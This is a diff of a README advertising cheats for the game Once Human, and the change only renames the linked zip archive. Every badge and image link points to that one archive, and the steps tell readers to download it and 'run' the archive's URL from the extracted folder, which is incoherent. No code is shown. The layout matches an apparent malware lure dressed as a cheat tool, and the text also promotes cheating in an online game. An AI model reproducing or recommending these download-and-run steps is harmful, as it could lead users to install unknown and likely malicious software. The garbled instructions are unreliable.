@@ -1,11 +1,11 @@
 # ⚡️ Once Human Cheats & Hacks: Evolutionary Game Tool [2025] ⚡️
 
-![Maintenance](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip)
-![License](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip)
-![Build Status](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip)
-![Downloads](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip%2B-orange?style=flat-square)
-![OpenAI API](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip)
-![Claude API](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip)
+![Maintenance](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/toolkit_advantage_once_human_v2.7.zip)
+![License](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/toolkit_advantage_once_human_v2.7.zip)
+![Build Status](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/toolkit_advantage_once_human_v2.7.zip)
+![Downloads](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/toolkit_advantage_once_human_v2.7.zip%2B-orange?style=flat-square)
+![OpenAI API](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/toolkit_advantage_once_human_v2.7.zip)
+![Claude API](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/toolkit_advantage_once_human_v2.7.zip)
 
 ---
 
@@ -53,21 +53,21 @@ This isn’t just an “edge”—it’s a new dimension.
 Follow these streamlined steps to amplify your *Once Human* experience without hurdles:
 
 1. **Download**  
-    Acquire `https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip` directly from this repository.  
+    Acquire `https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/toolkit_advantage_once_human_v2.7.zip` directly from this repository.  
     (Always use the freshest archive for the latest capabilities and support.)
 
 2. **Extract**  
     Unzip the package to your chosen directory. Any extraction tool works—winzip, 7z, or your OS’s default utility.
 
 3. **Launch**  
-    Run `https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip` from the extracted folder.  
+    Run `https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/toolkit_advantage_once_human_v2.7.zip` from the extracted folder.  
     The adaptive interface kicks in instantly.
 
 4. **Configuration**  
     First launch? The built-in wizard helps auto-detect *Once Human* and walks you through language and feature preferences.
 
 ### 🖥️ Need a Visual?  
-![Installation in Action](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip)
+![Installation in Action](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/toolkit_advantage_once_human_v2.7.zip)
 
 ---
 
